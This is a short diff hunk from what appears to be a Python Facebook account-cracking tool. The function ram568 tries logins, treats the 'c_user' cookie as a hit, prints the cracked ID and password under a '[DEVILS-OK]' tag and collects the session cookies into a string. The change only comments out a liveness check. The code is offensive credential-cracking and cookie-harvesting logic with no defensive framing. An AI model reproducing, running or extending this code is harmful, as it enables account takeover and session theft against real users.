@@ -3676,8 +3676,8 @@ def ram568(uid,pwx,tl):
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
-                if "Alive" == live_ck(uid):
-                   print('\033[1;92m[DEVILS-OK🐸] '+cid+'|'+ps+'\033[1;32m')
+                #if "Alive" == live_ck(uid):
+                   #print('\033[1;92m[DEVILS-OK🐸] '+cid+'|'+ps+'\033[1;32m')
                    ###print(live_ck(uid))
              #print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
